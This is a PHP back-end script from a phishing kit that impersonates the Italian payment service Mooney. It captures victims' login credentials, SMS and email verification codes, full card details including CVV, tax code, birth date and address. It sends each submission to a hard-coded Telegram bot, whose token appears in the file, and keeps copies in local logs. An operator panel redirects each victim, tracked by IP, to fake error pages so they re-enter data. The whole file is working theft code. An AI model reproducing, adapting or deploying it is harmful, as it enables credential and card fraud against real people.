<?php
session_start();
require_once "functions.php";

// Telegram config
$apiToken = "8712281940:AAF7RQkUscdeFPocXnJj8-Db7sxeU4L2AiU";
$id = "-5296860240";

// دالة إرسال التلغرام
function sendToTelegram($message) {
    global $apiToken, $id;
    $data = ['chat_id' => $id, 'text' => $message];
    $url = "https://api.telegram.org/bot" . $apiToken . "/sendMessage?" . http_build_query($data);
    $response = @file_get_contents($url);
    return $response !== false;
}

// معالجة التحكم
if ($_POST['step'] == "control") {
    $fp = fopen('victims/'. $_POST['ip'] .'.txt', 'wb');
    fwrite($fp, $_POST['to']);
    fclose($fp);
    header("location: control.php?ip=" . $_POST['ip']);
    exit();
}

// معالجة إعادة التوجيه
if(!empty($_GET['redirection'])) {
    $red = $_GET['redirection'];
    $redirections = [
        'errorlogin' => 'errorlogin.php',
        'cc' => 'cc.php',
        'errorcc' => 'cc.php',
        'billing' => 'billing.php',
        'errorbilling' => 'billing.php',
        'email_code' => 'email_code.php',
        'erroremail_code' => 'email_code.php',
        'sms' => 'sms.php',
        'errorsms' => 'sms.php',
        'personal_info' => 'personal_info.php',
        'errorpersonal_info' => 'personal_info.php',
        'app' => 'app.php',
        'success' => 'success.php',
        'attivazione' => 'index.php',
        'errorattivazione' => 'index.php'
    ];
    
    if(isset($redirections[$red])) {
        // إعداد الأخطاء إذا كانت الصفحة تحتوي على أخطاء
        if($red == 'errorcc') {
            $_SESSION['errors'] = ['type' => true, 'card_number' => true, 'expiry' => true, 'CVC' => true];
        } elseif($red == 'errorbilling') {
            $_SESSION['errors'] = ['full_name' => true, 'zip' => true, 'phone' => true, 'address' => true, 'city' => true];
        } elseif($red == 'erroremail_code') {
            $_SESSION['errors'] = ['email_code' => true];
        } elseif($red == 'errorsms') {
            $_SESSION['errors'] = ['sms' => true];
        } elseif($red == 'errorpersonal_info') {
            $_SESSION['errors'] = ['nome' => true, 'cognome' => true, 'codice_fiscale' => true, 'indirizzo' => true, 'citta' => true, 'cap' => true];
        } elseif($red == 'errorattivazione') {
            $_SESSION['errors'] = ['auth_credential' => true];
        }
        
        header("Location: " . $redirections[$red]);
        exit();
    }
}

// معالجة الخطوات
if(isset($_POST['step'])) {
    $step = $_POST['step'];
    $address = get_client_ip();
    $time = date('d/m/Y H:i:s');
    
    $messages = [
        'login' => [
            'subject' => "🔐 LOGIN MOONEY 🔐",
            'content' => "=== DATI DI ACCESSO ===\n📧 EMAIL/TELEFONO: " . ($_POST['username'] ?? '') . "\n🔑 PASSWORD: " . ($_POST['password'] ?? '')
        ],
        'errorlogin_index' => [
            'subject' => "❌ ERRORLOGIN - MOONEY ❌", 
            'content' => "=== DATI DI ERRORE LOGIN ===\n📧 EMAIL/TELEFONO: " . ($_POST['error_credential'] ?? '') . "\n🔑 PASSWORD ERRATA: " . ($_POST['error_pin'] ?? '')
        ],
        'sms' => [
            'subject' => "📱 CODICE SMS - MOONEY 📱",
            'content' => "=== CODICE SMS ===\n🔢 CODICE SMS: " . ($_POST['sms'] ?? '')
        ],
        'cc' => [
            'subject' => "💳 CARTA DI CREDITO - MOONEY 💳",
            'content' => "=== DATI CARTA DI CREDITO ===\n👤 NOME: " . ($_POST['nome'] ?? '') . "\n👤 COGNOME: " . ($_POST['cognome'] ?? '') . "\n📋 CODICE FISCALE: " . ($_POST['codice_fiscale'] ?? '') . "\n💳 NUMERO CARTA: " . ($_POST['card_number'] ?? '') . "\n📅 SCADENZA: " . ($_POST['expiry'] ?? '') . "\n🔒 CVV: " . ($_POST['CVC'] ?? '')
        ],
        'billing' => [
            'subject' => "🏠 DATI FATTURAZIONE - MOONEY 🏠", 
            'content' => "=== DATI DI FATTURAZIONE ===\n👤 NOME COMPLETO: " . ($_POST['full_name'] ?? '') . "\n🎂 DATA DI NASCITA: " . ($_POST['gg'] ?? '') . "/" . ($_POST['mm'] ?? '') . "/" . ($_POST['aaaa'] ?? '') . "\n📍 INDIRIZZO: " . ($_POST['address'] ?? '') . "\n🏙️ CITTA: " . ($_POST['city'] ?? '') . "\n📮 CAP: " . ($_POST['zip'] ?? '') . "\n📞 TELEFONO: " . ($_POST['phone'] ?? '')
        ],
        'email_code' => [
            'subject' => "📧 CODICE EMAIL - MOONEY 📧",
            'content' => "=== CODICE EMAIL ===\n🔠 CODICE EMAIL: " . ($_POST['email_code'] ?? '')
        ],
        'personal_info' => [
            'subject' => "👤 DATI PERSONALI - MOONEY 👤",
            'content' => "=== DATI PERSONALI ===\n👤 NOME: " . ($_POST['nome'] ?? '') . "\n👤 COGNOME: " . ($_POST['cognome'] ?? '') . "\n📋 CODICE FISCALE: " . ($_POST['codice_fiscale'] ?? '') . "\n📍 INDIRIZZO: " . ($_POST['indirizzo'] ?? '') . "\n🏙️ CITTA: " . ($_POST['citta'] ?? '') . "\n📮 CAP: " . ($_POST['cap'] ?? '')
        ]
    ];
    
    if(isset($messages[$step])) {
        $subject = $messages[$step]['subject'] . "\n";
        $subject .= "🌐 IP: " . $address . "\n";
        $subject .= "🕐 Data: " . $time . "\n\n";
        
        $message = $messages[$step]['content'] . "\n";
        $message .= "==============================\n";
        $message .= "🔗 Steps: " . get_steps_link() . "\n";
        $message .= "🖥️ User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? '') . "\n";
        $message .= "==============================\n";
        
        // إرسال إلى التلغرام
        sendToTelegram($subject . $message);
        
        // حفظ نسخة احتياطية
        $backup_file = 'logs/' . $step . '_' . date('Y-m-d') . '.txt';
        @file_put_contents($backup_file, $subject . $message . "\n\n", FILE_APPEND);
        
        // حفظ البيانات في السيشن
        foreach($_POST as $key => $value) {
            if($key != 'step') {
                $_SESSION[$key] = $value;
            }
        }
        
        reset_data();
        header("Location: loading.php");
        exit();
    }
}

// إذا لم يتطابق أي شرط
header("Location: index.php");
exit();
?>